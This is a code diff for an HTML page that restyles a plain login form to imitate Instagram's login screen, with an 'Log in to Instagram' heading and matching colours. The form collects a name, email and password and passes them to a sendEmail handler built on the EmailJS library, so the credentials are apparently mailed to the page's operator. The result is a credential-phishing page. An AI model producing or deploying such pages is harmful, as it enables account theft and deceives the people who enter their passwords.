@@ -3,8 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Login Page - Instagram Style</title>
     <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fafafa; /* لون خلفية الصفحة */
+            font-family: Arial, sans-serif;
+        }
+
+        main {
+            background-color: #ffffff; /* لون خلفية الحاوية */
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* ظل */
+            width: 350px; /* عرض الحاوية */
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 26px;
+            margin-bottom: 20px;
+            color: #262626; /* لون العنوان الرئيسي */
+        }
+
+        form {
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #262626; /* لون النص */
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #dbdbdb; /* لون الحدود */
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #3897f0; /* لون زر تسجيل الدخول */
+            color: #ffffff;
+            text-decoration: none;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #1675c1; /* لون الزر عند التحويم */
+        }
+    </style>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
@@ -26,7 +92,7 @@
 </head>
 <body>
     <main>
-        <h1>Login</h1>
+        <h1>Log in to Instagram</h1>
         <form onsubmit="sendEmail(event)">
             <label for="fullname">Full Name:</label>
             <input type="text" id="fullname" name="fullname" autocomplete="name" required><br>
@@ -34,11 +100,12 @@
             <input type="email" id="email" name="email" autocomplete="email" required><br>
             <label for="password">Password:</label>
             <input type="password" id="password" name="password" autocomplete="new-password" required><br>
-            <button type="submit">Submit</button>
+            <button type="submit">Log In</button>
         </form>
     </main>
 </body>
 </html>
+
 
 
 
